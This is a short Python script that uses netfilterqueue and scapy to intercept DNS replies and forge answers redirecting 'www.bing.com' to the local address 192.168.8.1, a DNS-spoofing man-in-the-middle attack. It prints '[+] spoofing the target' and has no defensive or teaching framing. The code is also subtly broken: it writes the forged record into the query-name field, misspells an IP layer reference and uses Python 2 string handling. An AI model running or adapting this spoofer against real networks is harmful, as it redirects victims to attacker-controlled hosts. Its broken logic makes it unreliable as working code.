import netfilterqueue
import scapy.all as scapy


from scapy_http import http






def captured_packet(packet):


   

    packet_cap=scapy.IP(packet.get_payload())
    if packet_cap.haslayer(scapy.DNSRR):

        qname=packet_cap[scapy.DNSQR].qname

        if "www.bing.com" in qname:

            print("[+] spoofing the target")

            answer=scapy.DNSRR(rrname=qname,rdata="192.168.8.1")

            packet_cap[scapy.DNS].qname=answer
            packet_cap[scapy.DNS].ancount=1

            del packet_cap[scapy.IP].chksum
            del packet_cap[scapy.Ip].len

            del packet_cap[scapy.UDP].len
            del packet_cap[scapy.UDP].chksum

            packet.set_payload(str(packet_cap))


            

        
   
   
   
   
   
    packet.accept()





queue=netfilterqueue.NetfilterQueue()


queue.bind(1,captured_packet)
queue.run()